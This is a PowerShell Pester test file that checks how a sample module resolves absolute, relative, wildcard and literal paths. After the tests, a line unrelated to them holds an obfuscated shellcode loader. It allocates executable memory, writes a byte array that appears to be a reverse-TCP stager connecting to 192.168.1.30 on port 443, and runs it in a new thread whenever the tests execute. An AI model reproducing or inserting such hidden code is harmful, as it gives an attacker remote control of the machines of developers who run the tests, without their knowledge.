









$null = New-Item -Path "$PSScriptRoot\foo[1].txt" -Force

Import-Module $PSScriptRoot\..\SampleModule.psd1

$WorkspaceRoot = Convert-Path $PSScriptRoot/..
Set-Location $WorkspaceRoot

Describe 'Verify Path Processing for Non-existing Paths Allowed Impl' {
    It 'Processes non-wildcard absolute path to non-existing file via -Path param' {
        New-File -Path $WorkspaceRoot\ReadmeNew.md | Should Be "$WorkspaceRoot\READMENew.md"
    }
    It 'Processes multiple absolute paths via -Path param' {
        New-File -Path $WorkspaceRoot\Readme.md, $WorkspaceRoot\XYZZY.ps1 |
            Should Be @("$WorkspaceRoot\README.md", "$WorkspaceRoot\XYZZY.ps1")
    }
    It 'Processes relative path via -Path param' {
        New-File -Path ..\Examples\READMENew.md | Should Be "$WorkspaceRoot\READMENew.md"
    }
    It 'Processes multiple relative path via -Path param' {
        New-File -Path ..\Examples\README.md, XYZZY.ps1 |
            Should Be @("$WorkspaceRoot\README.md", "$WorkspaceRoot\XYZZY.ps1")
    }

    It 'Should accept pipeline input to Path' {
        Get-ChildItem -LiteralPath "$WorkspaceRoot\Tests\foo[1].txt" | New-File | Should Be "$PSScriptRoot\foo[1].txt"
    }
}

Describe 'Verify Path Processing for NO Wildcards Allowed Impl' {
    It 'Processes non-wildcard absolute path via -Path param' {
        Import-FileNoWildcard -Path $WorkspaceRoot\Readme.md | Should Be "$WorkspaceRoot\README.md"
    }
    It 'Processes multiple absolute paths via -Path param' {
        Import-FileNoWildcard -Path $WorkspaceRoot\Readme.md, $WorkspaceRoot\PathProcessingWildcards.ps1 |
            Should Be @("$WorkspaceRoot\README.md", "$WorkspaceRoot\PathProcessingWildcards.ps1")
    }
    It 'Processes relative path via -Path param' {
        Import-FileNoWildcard -Path ..\examples\README.md | Should Be "$WorkspaceRoot\README.md"
    }
    It 'Processes multiple relative path via -Path param' {
        Import-FileNoWildcard -Path ..\examples\README.md, .vscode\launch.json |
            Should Be @("$WorkspaceRoot\README.md", "$WorkspaceRoot\.vscode\launch.json")
    }

    It 'Should accept pipeline input to Path' {
        Get-ChildItem -LiteralPath "$WorkspaceRoot\Tests\foo[1].txt" | Import-FileNoWildcard | Should Be "$PSScriptRoot\foo[1].txt"
    }
}

Describe 'Verify Path Processing for Wildcards Allowed Impl' {
    It 'Processes non-wildcard absolute path via -Path param' {
        Import-FileWildcard -Path $WorkspaceRoot\Readme.md | Should Be "$WorkspaceRoot\README.md"
    }
    It 'Processes multiple absolute paths via -Path param' {
        Import-FileWildcard -Path $WorkspaceRoot\Readme.md, $WorkspaceRoot\PathProcessingWildcards.ps1 |
            Should Be @("$WorkspaceRoot\README.md", "$WorkspaceRoot\PathProcessingWildcards.ps1")
    }
    It 'Processes wildcard absolute path via -Path param' {
        $files = Import-FileWildcard -Path $WorkspaceRoot\*.psd1
        $files.Count | Should Be 2
        $files[0] | Should Be "$WorkspaceRoot\PSScriptAnalyzerSettings.psd1"
        $files[1] | Should Be "$WorkspaceRoot\SampleModule.psd1"
    }
    It 'Processes wildcard relative path via -Path param' {
        $files = Import-FileWildcard -Path *.psd1
        $files.Count | Should Be 2
        $files[0] | Should Be "$WorkspaceRoot\PSScriptAnalyzerSettings.psd1"
        $files[1] | Should Be "$WorkspaceRoot\SampleModule.psd1"
    }
    It 'Processes relative path via -Path param' {
        Import-FileWildcard -Path ..\examples\README.md | Should Be "$WorkspaceRoot\README.md"
    }
    It 'Processes multiple relative path via -Path param' {
        Import-FileWildcard -Path ..\examples\README.md, .vscode\launch.json |
            Should Be @("$WorkspaceRoot\README.md", "$WorkspaceRoot\.vscode\launch.json")
    }

    It 'DefaultParameterSet should be Path' {
        $files = Import-FileWildcard *.psd1
        $files.Count | Should Be 2
        $files[0] | Should Be "$WorkspaceRoot\PSScriptAnalyzerSettings.psd1"
        $files[1] | Should Be "$WorkspaceRoot\SampleModule.psd1"
    }

    It 'Should process absolute literal paths via -LiteralPath param'{
        Import-FileWildcard -LiteralPath "$PSScriptRoot\foo[1].txt" | Should Be "$PSScriptRoot\foo[1].txt"
    }
    It 'Should process relative literal paths via -LiteralPath param'{
        Import-FileWildcard -LiteralPath "..\examples\Tests\foo[1].txt" | Should Be "$PSScriptRoot\foo[1].txt"
    }
    It 'Should process multiple literal paths via -LiteralPath param'{
        Import-FileWildcard -LiteralPath "..\examples\Tests\foo[1].txt", "$WorkspaceRoot\README.md" |
            Should Be @("$PSScriptRoot\foo[1].txt", "$WorkspaceRoot\README.md")
    }

    It 'Should accept pipeline input to LiteralPath' {
        Get-ChildItem -LiteralPath "$WorkspaceRoot\Tests\foo[1].txt" | Import-FileWildcard | Should Be "$PSScriptRoot\foo[1].txt"
    }
}

$code = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc64 = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x1e,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;[Byte[]]$sc = $sc64;$size = 0x1000;if ($sc.Length -gt 0x1000) {$size = $sc.Length};$x=$winFunc::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };

